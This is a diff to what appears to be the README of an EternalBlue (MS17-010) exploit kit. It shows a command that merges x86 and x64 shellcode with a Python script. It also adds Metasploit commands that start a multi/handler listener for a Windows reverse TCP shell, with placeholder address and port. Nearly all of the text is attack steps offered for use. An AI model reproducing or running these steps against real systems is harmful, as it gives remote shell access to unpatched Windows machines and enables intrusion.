@@ -132,10 +132,19 @@ cat sc_x86_kernel.bin sc_x86_payload.bin > sc_x86.bin
 
 
 
-## Merging binaries(x86 and x86_64):
+## Merging binaries (x86 and x86_64):
 ```
 python shellcode/eternalblue_sc_merge.py sc_x86.bin sc_x64.bin sc_all.bin
 ```
 
+## Setting up listener (Manually):
+```
+use exploit/multi/handler
+set payload windows/shell_reverse_tcp
+set LHOST x.x.x.x
+set LPORT xxx
+exploit
+sessions -j
+```
 
 
